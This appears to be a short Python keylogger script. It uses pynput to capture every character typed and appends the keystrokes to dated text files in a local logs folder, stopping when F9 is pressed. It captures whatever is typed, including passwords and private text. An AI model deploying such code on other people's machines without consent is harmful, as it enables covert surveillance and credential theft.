from time import sleep, time
from pynput import keyboard, mouse
from datetime import date
import atexit
import sys

day = date.today()
charsperline = 100

listener = ""
stop = False

logpath = "./logs/"+str(day)+".txt"


currentcharcount = 0
currentline = ""

def saveline():
    global currentcharcount
    global currentline

    writer = open(logpath, "a")
    writer.write(currentline+"\n")
    writer.close()
    currentcharcount = 0
    currentline = ""

def onkeypress(keyevent):
    try:
        if keyevent == keyboard.Key.f9:
            listener.stop()

        global currentcharcount
        global currentline
        key = keyevent.char
        if currentcharcount+len(key) > charsperline:
            saveline()
            

        currentline += key
        currentcharcount += len(key)

    except:
        pass

atexit.register(saveline)

listener = keyboard.Listener(on_press=onkeypress)
listener.start()
listener.join()